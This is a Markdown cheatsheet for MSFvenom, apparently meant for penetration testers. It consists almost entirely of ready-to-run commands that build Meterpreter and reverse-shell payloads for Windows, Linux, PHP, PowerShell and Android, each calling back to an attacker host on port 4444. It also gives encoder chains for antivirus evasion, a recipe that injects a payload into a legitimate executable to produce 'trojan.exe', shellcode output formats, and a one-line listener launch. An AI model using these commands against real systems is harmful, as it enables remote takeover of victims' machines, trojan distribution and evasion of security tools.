# MSFvenom Cheatsheet

## Quick Reference

### Basic Payload Generation

```bash
# Windows reverse Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# PowerShell payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ps1 -o payload.ps1

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o malicious.apk
```

### Output Formats

```bash
msfvenom -l formats
# exe, elf, dll, macho, c, python, ruby, hex, raw, ps1, vba, asp, jsp, war, bash, csharp, psh
```

### Listing

```bash
msfvenom -l payloads          # All payloads
msfvenom -l encoders          # All encoders
msfvenom -l formats           # All output formats
msfvenom -l nops              # NOP generators
msfvenom -l payloads windows  # Windows payloads only
msfvenom -l payloads linux    # Linux payloads only
```

### Encoders

```bash
# No encoding (default)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e generic/none -f exe

# Shikata Ga Nai (polymorphic)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe

# Multi-encoder chain
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 3 | msfvenom -e x86/fnstenv_mov -i 2 -f exe
```

### Bad Characters

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b '\x00\x0a\x0d' -f c
```

### Template-Based Payloads

```bash
# Inject into legitimate executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x /usr/share/windows-resources/binaries/rar.exe -k -f exe -o trojan.exe
```

### Shellcode Formats

```bash
# C array
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c

# Python
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python

# Raw (for injection tools)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shellcode.bin

# Hex string
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f hex

# Ruby
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ruby
```

### Handler Setup

```bash
# Auto-generate handler resource script
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# Launch handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"
```

### Common Payloads

| Payload | Use Case |
|---------|----------|
| `windows/meterpreter/reverse_tcp` | Standard Windows reverse |
| `windows/meterpreter/reverse_https` | Encrypted Windows reverse |
| `windows/shell_reverse_tcp` | Simple Windows command shell |
| `linux/x86/meterpreter/reverse_tcp` | 32-bit Linux reverse |
| `linux/x64/meterpreter/reverse_tcp` | 64-bit Linux reverse |
| `php/meterpreter/reverse_tcp` | PHP webshell |
| `java/jsp_shell_reverse_tcp` | JSP reverse shell |
| `python/meterpreter/reverse_tcp` | Python stager |
| `powershell/meterpreter/reverse_tcp` | PowerShell stager |
| `android/meterpreter/reverse_tcp` | Android device |

### Stageless vs Staged

| Type | Example | Size | Reliability |
|------|---------|------|-------------|
| Staged | `windows/meterpreter/reverse_tcp` | Small | Requires handler |
| Stageless | `windows/meterpreter_reverse_tcp` | Large | Standalone |

### Useful Flags

| Flag | Description |
|------|-------------|
| `-p` | Payload |
| `-f` | Format |
| `-o` | Output file |
| `-e` | Encoder |
| `-b` | Bad chars |
| `-n` | NOP sled size |
| `-i` | Encoding iterations |
| `-s` | Max payload size |
| `-x` | Template executable |
| `-k` | Keep template behavior |
| `--smallest` | Minimize payload size |
| `-v` | Variable name |
